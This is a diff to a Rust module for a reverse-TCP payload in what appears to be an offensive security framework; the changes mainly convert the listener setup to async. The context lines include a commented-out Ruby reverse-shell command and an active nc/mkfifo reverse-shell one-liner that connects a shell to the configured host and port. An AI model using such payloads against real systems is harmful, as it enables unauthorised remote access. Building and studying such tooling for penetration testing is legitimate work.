@@ -3,13 +3,16 @@ use crate::core::{
     opt::Opt,
     payload::{reverse::Reverse, Info, Payload},
 };
+use async_trait::async_trait;
 use log::info;
 use std::error::Error;
 
+#[derive(Clone)]
 pub struct RubyReverseTcp {
     pub reverse: Reverse,
 }
 
+#[async_trait]
 impl Payload for RubyReverseTcp {
     fn default() -> Self {
         RubyReverseTcp {
@@ -17,10 +20,10 @@ impl Payload for RubyReverseTcp {
         }
     }
 
-    fn pretask(&self) -> Result<(), Box<dyn std::error::Error>> {
-        let mut handler = GenericTcpHandler::new(&self.reverse.lhost, &self.reverse.lport)?;
+    async fn pretask(&self) -> Result<(), Box<dyn std::error::Error>> {
+        let mut handler = GenericTcpHandler::new(&self.reverse.lhost, &self.reverse.lport).await?;
         // TODO: how to propogate Result here?
-        handler.listen_for_one().unwrap();
+        handler.listen_for_one().await?;
         Ok(())
     }
 
@@ -33,7 +36,7 @@ impl Payload for RubyReverseTcp {
         (IO.popen(l,"rb"){{|fd| fd.each_line {{|o| c.puts(o.strip) }}}}) rescue nil }}'"#,
                 self.reverse.lhost, self.reverse.lport
             );
-            */
+        */
         // TODO: for now just setting blob as nc mkfifo for testing
         let blob = format!(
             "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {} {} >/tmp/f",
